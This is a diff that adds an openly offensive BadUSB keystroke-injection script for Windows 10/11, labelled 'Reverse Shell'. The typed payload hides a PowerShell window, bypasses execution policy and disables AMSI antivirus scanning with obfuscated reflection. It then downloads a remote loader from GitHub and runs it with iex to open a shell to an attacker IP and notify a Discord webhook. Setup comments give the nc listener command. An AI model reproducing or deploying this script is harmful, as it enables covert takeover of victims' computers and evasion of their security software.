@@ -1,0 +1,24 @@
+REM ============================================================
+REM 🔌 Reverse Shell - Windows
+REM ============================================================
+REM Author: dil1thium
+REM Version: 3.0 (Modular)
+REM Target: Windows 10/11
+REM Category: Execution
+REM
+REM SETUP:
+REM   1. Start listener: nc -lvnp 4444
+REM   2. Replace YOUR_IP with your IP address
+REM   3. Replace YOUR_PORT with your port
+REM
+REM CONFIGURE:
+REM   YOUR_DISCORD_WEBHOOK - Receives notification
+REM   YOUR_IP - Your attacker IP
+REM   YOUR_PORT - Port (default 4444)
+REM ============================================================
+ID 1234:5678 Manufacturer:Keyboard
+DELAY 500
+GUI r
+DELAY 400
+STRING powershell -w h -ep bypass "$a=[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils');$f=$a.GetField('amsi'+'InitFailed','NonPublic,Static');$f.SetValue($null,$true);$env:DC='YOUR_DISCORD_WEBHOOK';$env:IP='YOUR_IP';$env:PT='YOUR_PORT';$env:M='shell';irm https://raw.githubusercontent.com/reschjonas/FlipperZero_BadUSB/main/remote-payloads/loaders/loader.ps1|iex"
+ENTER
